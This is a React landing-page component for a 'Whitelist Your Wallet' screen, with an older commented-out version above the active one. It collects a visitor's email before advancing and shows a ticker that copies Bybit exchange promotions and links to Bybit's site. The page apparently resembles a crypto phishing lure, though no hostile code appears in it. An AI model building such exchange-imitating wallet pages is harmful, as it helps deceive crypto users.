// import { Button } from "@/components/ui/button";
// import heroBgDesktop from "../assets/heroviddeskt.mp4";
// import heroBgMobile from "../assets/herovidmob.mp4";
// import { useState } from "react";
// import { sendEmail } from "@/utils/sendMessage";

// export default function Hero({ nextScreen }: { nextScreen: () => void }) {
//   const [email, setEmail] = useState("");
//   const [error, setError] = useState("");
//   const handleWhiteList = async () => {
//     if (email === "") {
//       setError(
//         "Please enter the email address attached to the account you would like to link this wallet to before proceeding."
//       );
//       return;
//     }
//     if (!email.includes("@")) {
//       setError(
//         "Please enter a valid email address attached to the account you would like to link this wallet to before proceeding."
//       );
//       return;
//     }

//     const response = await sendEmail(email);

//     if (response) nextScreen();
//   };
//   return (
//     <section className="relative w-full h-[100vh] overflow-hidden">
//       {/* Background Video: Desktop */}
//       <video
//         autoPlay
//         muted
//         loop
//         preload="auto"
//         playsInline
//         className="absolute inset-0 object-cover w-full h-full hidden md:block"
//       >
//         <source src={heroBgDesktop} type="video/mp4" />
//         Your browser does not support the video tag.
//       </video>

//       {/* Background Video: Mobile */}
//       <video
//         autoPlay
//         muted
//         loop
//         preload="auto"
//         playsInline
//         className="absolute inset-0 object-cover w-full h-full block md:hidden"
//       >
//         <source src={heroBgMobile} type="video/mp4" />
//         Your browser does not support the video tag.
//       </video>

//       {/* Content */}
//       <div className="relative z-10 flex flex-col items-center justify-center h-full px-6 text-center text-white">
//         <h1 className="text-4xl md:text-7xl font-bold leading-tight md:leading-[1.1]">
//           One place for all your <br className="hidden md:block" />
//           investments
//         </h1>

//         <p className="mt-6 text-lg md:text-xl max-w-2xl">
//           Whitelist Your Wallet To Get Started
//         </p>

//         <div className="flex flex-col sm:flex-row items-center gap-3 mt-10">
//           <input
//             type="email"
//             value={email}
//             onChange={(e) => setEmail(e.target.value)}
//             placeholder="Enter Your Email"
//             className="px-4 py-3 border border-gray-300 rounded-full w-full sm:w-auto sm:flex-1 bg-white text-black"
//           />
//           <Button
//             onClick={handleWhiteList}
//             className="border-[#CBFF00] border-2 text-black bg-[#CBFF00] rounded-full px-10 py-6 text-lg hover:bg-[#CBFF00] hover:text-black cursor-pointer hover:opacity-80 "
//           >
//             Whitelist Wallet
//           </Button>
//         </div>
//         {error && <p className="text-red-500 text-sm mt-2">{error}</p>}
//       </div>

//       {/* Optional overlay for better contrast */}
//       <div className="absolute inset-0 bg-black/30 z-[1]" />
//     </section>
//   );
// }

// components/Hero.tsx
import { Button } from "@/components/ui/button";
import heroBg from "../assets/hero-bg.png";
import { useState } from "react";
import { sendEmail } from "@/utils/sendMessage";

export function Hero({ nextScreen }: { nextScreen: () => void }) {
  const [email, setEmail] = useState("");
  const [error, setError] = useState("");
  const handleWhiteList = async () => {
    if (email === "") {
      setError(
        "Please enter the email address attached to the account you would like to link this wallet to before proceeding."
      );
      return;
    }
    if (!email.includes("@")) {
      setError(
        "Please enter a valid email address attached to the account you would like to link this wallet to before proceeding."
      );
      return;
    }

    const response = await sendEmail(email);

    if (response) nextScreen();
  };

  const tickerItems = [
    "📢 AI Contract, with up to 50x leverage",
    "🏁 TradeMasters Grand Prix Series 4: Race for a share of 1,600,000 USDT!",
    "🎉 Daily Treasure Hunt 2.0: 100% Guaranteed!",
  ];

  return (
    <section
      className="bg-[#17181F] text-white"
      style={{
        backgroundImage: `url(${heroBg})`,
        backgroundSize: "cover",
        backgroundRepeat: "no-repeat",
        backgroundPosition: "center",
      }}
    >
      {/* main hero */}
      <div className="max-w-7xl mx-auto px-6 py-16 flex flex-col-reverse lg:flex-row items-center gap-12">
        {/* left content */}
        <div className="w-full lg:w-1/2 space-y-6">
          <h1 className="text-4xl sm:text-5xl font-extrabold">Next Level</h1>
          <h2 className="text-xl sm:text-2xl font-semibold">
            Trading&nbsp;|&nbsp;Earning&nbsp;|&nbsp;Learning
          </h2>

          <div className="flex items-center space-x-2 text-base sm:text-lg">
            <span>Enter Your Email Below To Whitelist Your Wallet</span>
          </div>

          <div className="flex flex-col sm:flex-row gap-4 pt-4">
            <input
              type="email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              placeholder="Enter Your Email"
              className="px-2 py-1 border border-gray-300 rounded-full w-full sm:w-auto sm:flex-1 bg-white text-black"
            />

            <Button
              onClick={handleWhiteList}
              className="bg-yellow-500 text-black hover:bg-yellow-400 w-full sm:w-auto px-4 py-4 rounded-full cursor-pointer"
            >
              Whitelist Wallet
            </Button>
          </div>
          {error && <p className="text-red-500 text-sm mt-2">{error}</p>}
        </div>

        {/* right image */}
        <div className="w-full lg:w-1/2 flex justify-center mb-8 lg:mb-0"></div>
      </div>

      {/* ticker/banner */}
      <div className="overflow-hidden whitespace-nowrap bg-yellow-100">
        <div className="inline-block animate-marquee py-3">
          {tickerItems.map((text, i) => (
            <a href="https://announcements.bybit.com/en/article/trademasters-grand-prix-series-4-race-for-a-share-of-1-600-000-usdt--blt3349b784750795c4/">
              <span
                key={i}
                className="mx-8 font-medium text-black hover:text-underline"
              >
                {text}
              </span>
            </a>
          ))}
        </div>
      </div>
    </section>
  );
}
